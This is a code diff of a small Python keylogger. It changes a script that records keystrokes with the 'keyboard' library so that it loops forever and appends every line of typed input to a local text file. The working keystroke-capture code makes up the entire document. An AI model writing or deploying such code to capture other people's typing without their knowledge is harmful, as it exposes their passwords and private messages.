@@ -1,12 +1,13 @@
 import keyboard
 
-recorded = keyboard.record(until='escape')
+while True:
+    recorded = keyboard.record(until='enter')
 
-for i in range(len(recorded)):
-    recorded[i] = str(recorded[i])
+    for i in range(len(recorded)):
+        recorded[i] = str(recorded[i])
 
-log = ' '.join(recorded)
+    log = ' '.join(recorded)
 
-f = open("logged_text.txt", "a")
-f.write(log)
-f.close()
+    f = open("logged_text.txt", "a")
+    f.write(log)
+    f.close()
